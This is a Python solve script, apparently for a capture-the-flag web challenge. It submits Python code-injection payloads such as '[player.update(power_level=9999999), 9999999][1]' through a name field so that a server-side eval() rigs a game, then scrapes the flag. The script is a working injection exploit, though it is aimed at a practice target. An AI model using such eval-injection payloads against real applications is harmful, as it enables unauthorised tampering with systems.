import requests
import re

BASE_URL = "http://chals1.apoorvctf.xyz:3001"

def solve():
    session = requests.Session()
    
    # PAYLOAD ANALISIS:
    # 1. [ ... ][1] -> Mengambil elemen kedua dari list.
    # 2. player.update(power_level=9999999) -> Mengubah status internal sesuai hint.
    # 3. 9999999 -> Angka yang dikembalikan ke fungsi eval() di server agar kita menang.
    
    # Kita coba 3 variasi payload "Clean Python"
    payloads = [
        # Taktik A: Menggunakan keyword arguments (Bypass {})
        "[player.update(power_level=9999999), 9999999][1]",
        
        # Taktik B: Menggunakan zenkai_boost (sesuai data JWT-mu)
        "[player.update(zenkai_boost=1000.0), 9999999][1]",
        
        # Taktik C: Jika 'player' ada di dalam session (sesuai JWT-mu)
        "[session['player'].update(power_level=9999999), 9999999][1]"
    ]

    for p in payloads:
        print(f"\n[*] Menguji Payload: {p}")
        # Reset session untuk tiap payload
        s = requests.Session()
        s.post(f"{BASE_URL}/", data={"name": p})
        
        # Cek Stage 1
        res = s.post(f"{BASE_URL}/attack")
        print(f"    -> Stage 1 Result: {res.text.strip()}")
        
        if res.text.strip() == "WIN":
            print("    [+] MELEWATI STAGE 1! Melanjutkan ke Jiren...")
            s.get(f"{BASE_URL}/arena") # Next stage
            s.post(f"{BASE_URL}/attack") # Stage 2
            s.get(f"{BASE_URL}/arena") # Next stage
            
            # Serangan Akhir ke Jiren
            final = s.post(f"{BASE_URL}/attack")
            print(f"    -> Stage 3 (Jiren) Result: {final.text.strip()}")
            
            if "WIN" in final.text:
                print("\n[!!!] KEMENANGAN MUTLAK!")
                html = s.get(f"{BASE_URL}/arena").text
                flag = re.findall(r"apoorvCTF\{.*?\}", html)
                print(f"FLAG: {flag[0] if flag else 'Cek manual di /arena'}")
                return
        else:
            print("    [-] Payload gagal (ERROR/LOSE).")

if __name__ == "__main__":
    solve()
